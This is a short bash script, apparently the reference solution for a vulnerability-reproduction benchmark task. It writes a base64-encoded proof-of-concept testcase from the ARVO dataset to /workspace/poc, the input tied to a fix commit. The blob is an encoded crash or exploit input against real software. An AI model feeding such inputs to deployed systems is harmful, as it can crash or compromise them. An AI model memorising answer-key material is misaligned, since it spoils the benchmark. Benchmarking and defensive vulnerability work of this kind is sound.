#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 05648b06 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
EAA7exgAAAAxwGR34wMAgpAAAgCQkgIAsZACAJAAKgBvgSaDAlAwggEBgAKZPIgADEn/OwlZRS+i35DFOv////8B4///AwCCkAACAJCSAgA/AAIAkAAqAG+BJQA735YAgDD+RQAxuGSGAAxXAAAAZXJmbHsYAAAAMMBDd+MDAYKQAAIAkJICAJAAKgBvgSWDAg3VfQEBgAIAPIgA/P8AAF9I////////EQACEJCSAgCxkCoAkAAqAG+BJYMCcBCCAQGAAv//////9P8PAAAAZXJmbHsYwOMDf2QAgpAAAgCQkgIAkAAqAG+BJYMCDdV9AQGA9/88iAD///8A////AeMDAIKQAAIAkJICALGQKgCQACoAb4ElgwJwMTg0NDY3NDQwNzM0MTkxMDI3NzJDd+MDAIKQAAIAkJICAJAAKgBvgSWDAg3VfQEBgAIAPIgA/P///////wHjAwIAAJCCEJCSAhyxeCoAkAAqAG+BJYMCcDCCAQGAAgnEbPoDAAAA////AeMDAIKQAAIQkJICALGQKgCQACoAb4ElgwJwMAoCATGAkACL4jJigIUDujGBpYClA4uL/xD/AAIAkJICAJAAKgBvgSWDAg3VfQEBgAIAPIgA/P8AAF9I////////EQACEJCSAgCxkCoAkAAqAG+BJYMCcBCCAQGAAv//////D/8A9AAAZXJmbHsYwOMDd2QAgpAAAgCQkgIAkAAqAG+BJYMCDdV9AQGA9/88iAD/////////AeMDAIKQAAIAkJICALGQKgCQACoAb4ElgwJwMIIB//+o////moRmbHsYAAAAMsBDd+MDAIKQAAIAkJICAJAAKgBvgSWDAlAxggEBgAIBAAAAAAD4xPGAw8ME3YD9YVsCAJAABgBhK0gBkAAPAAaQAPwAAAAA/58BtwGQAA8AbxuCBAAA9wCAYZDqAJAAAgCQAAYAgSUqAG+BJYMCcDAKAgE=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
